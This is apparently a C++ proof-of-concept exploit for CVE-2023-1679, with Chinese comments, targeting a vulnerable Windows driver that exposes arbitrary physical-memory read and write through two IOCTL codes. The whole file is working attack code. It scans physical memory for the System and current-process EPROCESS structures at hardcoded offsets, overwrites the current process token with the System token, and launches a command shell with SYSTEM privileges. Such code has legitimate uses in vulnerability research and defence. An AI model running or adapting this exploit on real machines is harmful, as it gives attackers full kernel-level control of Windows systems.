#include <iostream>
#include <Windows.h>
#include <winioctl.h>

#define SymLinkName L"\\\\.\\MyDrivers0_0_1"

HANDLE hDevice;

struct DATA_READ_PA
{
    PVOID PhysicalAddress;
    DWORD unit;
    DWORD size;
};

VOID ReadPA_0x9C406104(PVOID pa, DWORD size, CHAR* output)
{
    DWORD dwWrite;
    DATA_READ_PA data;
    data.PhysicalAddress = pa;
    data.unit = 1;
    data.size = size;
    DeviceIoControl(hDevice, 0x9C406104, &data, sizeof(data), output, data.size * data.unit, &dwWrite, NULL);
}

struct DATA_WRITE_PA
{
    PVOID PhysicalAddress;
    DWORD unit;
    DWORD size;
    DWORD64 value;
};

VOID WritePA_0x9C40A108(PVOID pa, DWORD size, DWORD64 value)
{
    DWORD dwWrite;
    DATA_WRITE_PA data;
    data.PhysicalAddress = pa;
    data.unit = 1;
    data.size = size;
    data.value = value;
    DeviceIoControl(hDevice, 0x9C40A108, &data, sizeof(data), NULL, 0, &dwWrite, NULL);
}

int main(int argc, char* argv[])
{
    // 取得 Device 的 Handle
    hDevice = CreateFile(SymLinkName, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_SYSTEM, 0);
    if (hDevice == INVALID_HANDLE_VALUE)
    {
        printf("Get Driver Handle Error with Win32 error code: %x\n", GetLastError());
        return 0;
    }

    // 1. 迴圈掃描整個物理記憶體
    PVOID read_address = (PVOID)0;
    DWORD64 SystemToken = 0, SystemEprocess = 0, TargetEprocess = 0;
    const DWORD UNIQUE_PROCESS_ID_OFFSET = 0x2e0, TOKEN_OFFSET = 0x358, IMAGE_FILE_NAME_OFFSET = 0x450;
    while (1)
    {
        // 2. 利用任意讀的漏洞一次讀 0x10000 的物理記憶體
        CHAR output[0x10000] = {0};
        ReadPA_0x9C406104(read_address, 0x10000, output);

        // 3. 確認讀取的物理記憶體中是否包含 System 或當前 Process 的 EPROCESS
        for (int offset = 0; offset < 0x10000 - IMAGE_FILE_NAME_OFFSET; offset++)
        {
            // 透過 UniqeuProcessId 和 ImageFileName 檢查是不是 System
            if (!SystemEprocess && *(DWORD64*)(output + offset + UNIQUE_PROCESS_ID_OFFSET) == 4 &&
                !memcmp((CHAR*)(output + offset + IMAGE_FILE_NAME_OFFSET), "System", 6))
            {
                SystemEprocess = (DWORD64)read_address + offset;
                SystemToken = *(DWORD64*)(output + offset + TOKEN_OFFSET);
                if ((SystemToken & 0xffff000000000000) != 0xffff000000000000)
                {
                    SystemEprocess = 0;
                    SystemToken = 0;
                }
                else
                {
                    printf("System EPROCESS PA: %llx, System Token: %llx\n\n", SystemEprocess, SystemToken);
                }
            }

            // 透過 UniqeuProcessId 和 ImageFileName 檢查是不是當前 Process
            if (!TargetEprocess && *(DWORD64*)(output + offset + UNIQUE_PROCESS_ID_OFFSET) == GetCurrentProcessId() &&
                !memcmp((CHAR*)(output + offset + IMAGE_FILE_NAME_OFFSET), "CVE-2023-1679.exe", 14))
            {
                TargetEprocess = (DWORD64)read_address + offset;
                printf("Current Process EPROCESS PA: %llx\n\n", TargetEprocess);
            }
        }

        // 如果找到 System 和當前 Process 的 EPROCESS 的 PA 就跳出迴圈
        if (SystemEprocess && TargetEprocess)
            break;

        read_address = (PVOID)((DWORD64)read_address + 0x10000);
    }

    // 4. 利用任意寫的漏洞竄改當前 Process 的 EPROCESS Token 的物理記憶體
    WritePA_0x9C40A108((PVOID)((DWORD64)TargetEprocess + TOKEN_OFFSET), 8, SystemToken);

    // 5. 彈出有 system 權限的 cmd
    system("cmd.exe");
    return 0;
}